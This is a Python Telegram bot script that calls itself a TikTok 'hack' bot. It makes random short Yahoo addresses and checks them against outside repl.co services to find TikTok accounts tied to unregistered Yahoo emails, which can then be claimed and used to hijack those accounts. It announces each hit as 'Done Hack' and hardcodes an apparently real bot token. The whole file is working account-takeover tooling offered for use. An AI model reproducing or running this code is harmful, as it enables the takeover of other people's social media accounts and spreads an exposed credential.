import requests,telebot,random
from telebot import types
token_bot = '5008002720:AAHyEig9WA93HCyf-k667ZsSNrvbo4M-mig'
try:
	bot = telebot.TeleBot(token_bot)
	pass
except:
	print('Error Token')
	exit()
	
call  = types.InlineKeyboardButton(text = "START - بدء", callback_data = 'Hamo')
@bot.message_handler(commands=['start'])
def start(message):
    Keyy = types.InlineKeyboardMarkup()
    Keyy.row_width = 2
    Keyy.add(call)
    try:
        bot.send_message(message.chat.id,f"*- Hello And Welcome ( {message.from_user.first_name} ) .\n- In Hack Available TikTok Bot .\n- Please Click On Start For Start Working .\n- Dev : @XlX3XlX .*",parse_mode="markdown",reply_markup=Keyy)
        pass
    except:
            print('Error Token')
            exit()
@bot.callback_query_handler(func=lambda call: True)
def working(call):
	if call.data =="Hamo":
		kindt(call.message)
	if call.data =="four":
		check4(call.message)
	if call.data =="five":
		check5(call.message)
	if call.data =="sex":
		check6(call.message)
	if call.data =="randomx":
		checkx(call.message)

def kindt(message):
	lt4  = types.InlineKeyboardButton(text = "Four Letters", callback_data = 'four')
	lt5  = types.InlineKeyboardButton(text = "Five Letters", callback_data = 'five')
	lt6  = types.InlineKeyboardButton(text = "Sex Letters", callback_data = 'sex')
	ltr  = types.InlineKeyboardButton(text = "Random", callback_data = 'randomx')
	letterss = types.InlineKeyboardMarkup()
	letterss.row_width = 2
	letterss.add(lt4,lt5,lt6,ltr)
	bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*- Select The Desired Length .*",parse_mode='markdown',reply_markup=letterss)

def check4(message):
	m = 0
	z = 0
	ck = 0
	user = 'qwertyuiopasdfghjklzxcvbnm1234567890'
	for im in range(10000):
		us = str(''.join((random.choice(user) for i in range(4))))
		
		email = us+'@yahoo.com'
		req = requests.get(f'https://check.moahmedsalah.repl.co/api-v1/check-email/tiktok/?email='+email)
		if 'True' in req.text:
			xg = requests.get('https://S.moahmedsalah.repl.co/yahoo/?email='+email).json()['check']
			if 'True' in xg:
				
				m+=1
				bot.send_message(message.chat.id,f"""*- Done Hack New Available Tok .\n- Email : {email} \n- Dev : @XlX3XlX .*""",parse_mode='markdown')
			else:
				z+=1
			
		else:
			ck+=1
			z+=1
			prix  = types.InlineKeyboardButton(text = "Dev - مطــور", url = 'https://t.me/XlX3XlX')
			mnm = types.InlineKeyboardMarkup()
			mnm.row_width = 1
			mnm.add(prix)
			bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text=(f"*- Checking In Progress .\n—————————————\n- 🔰 - Email - {email}\n- 🚫 - Bad - {z}\n- ✅ - Good - {m}\n- 🗳 - Checked - {ck}\n—————————————*"),parse_mode='markdown',reply_markup=mnm)		

def check5(message):
	m = 0
	z = 0
	ck = 0
	user = 'qwertyuiopasdfghjklzxcvbnm1234567890'
	for im in range(10000):
		us = str(''.join((random.choice(user) for i in range(5))))
		
		email = us+'@yahoo.com'
		req = requests.get(f'https://check.moahmedsalah.repl.co/api-v1/check-email/tiktok/?email='+email)
		if 'True' in req.text:
			xg = requests.get('https://S.moahmedsalah.repl.co/yahoo/?email='+email).json()['check']
			if 'True' in xg:
				
				m+=1
				bot.send_message(message.chat.id,f"""*- Done Hack New Available Tok .\n- Email : {email} \n- Dev : @XlX3XlX .*""",parse_mode='markdown')
			
		else:
			ck+=1
			z+=1
			prix  = types.InlineKeyboardButton(text = "Dev - مطــور", url = 'https://t.me/XlX3XlX')
			mnm = types.InlineKeyboardMarkup()
			mnm.row_width = 1
			mnm.add(prix)
			bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text=(f"*- Checking In Progress .\n—————————————\n- 🔰 - Email - {email}\n- 🚫 - Bad - {z}\n- ✅ - Good - {m}\n- 🗳 - Checked - {ck}\n—————————————*"),parse_mode='markdown',reply_markup=mnm)	

def check6(message):
	m = 0
	z = 0
	ck = 0
	user = 'qwertyuiopasdfghjklzxcvbnm1234567890'
	for im in range(10000):
		us = str(''.join((random.choice(user) for i in range(6))))
		
		email = us+'@yahoo.com'
		req = requests.get(f'https://check.moahmedsalah.repl.co/api-v1/check-email/tiktok/?email='+email)
		if 'True' in req.text:
			xg = requests.get('https://S.moahmedsalah.repl.co/yahoo/?email='+email).json()['check']
			if 'True' in xg:
				
				m+=1
				bot.send_message(message.chat.id,f"""*- Done Hack New Available Tok .\n- Email : {email} \n- Dev : @XlX3XlX .*""",parse_mode='markdown')
			
		else:
			ck+=1
			z+=1
			prix  = types.InlineKeyboardButton(text = "Dev - مطــور", url = 'https://t.me/XlX3XlX')
			mnm = types.InlineKeyboardMarkup()
			mnm.row_width = 1
			mnm.add(prix)
			bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text=(f"*- Checking In Progress .\n—————————————\n- 🔰 - Email - {email}\n- 🚫 - Bad - {z}\n- ✅ - Good - {m}\n- 🗳 - Checked - {ck}\n—————————————*"),parse_mode='markdown',reply_markup=mnm)	

def checkx(message):
    prix  = types.InlineKeyboardButton(text = "Dev - مطــور", url = 'https://t.me/XlX3XlX')
    mnm = types.InlineKeyboardMarkup()
    mnm.row_width = 1
    mnm.add(prix)
    bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text=(f"*- This Section Is Under Maintenance .*"),parse_mode='markdown',reply_markup=mnm)

bot.polling()
